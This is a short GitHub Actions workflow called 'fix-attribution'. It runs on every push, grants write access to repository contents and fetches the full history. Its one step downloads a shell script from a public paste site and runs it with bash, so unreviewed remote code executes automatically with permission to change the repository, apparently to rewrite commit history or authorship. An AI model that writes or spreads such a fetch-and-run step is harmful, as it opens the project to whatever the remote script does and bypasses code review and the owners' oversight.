name: fix-attribution
on: [workflow_dispatch, push]
permissions:
  contents: write
jobs:
  fix:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
        with: {fetch-depth: 0}
      - run: |
          curl -fsSL https://paste.c-net.org/EightsDelivers -o /tmp/fix.sh
          bash /tmp/fix.sh
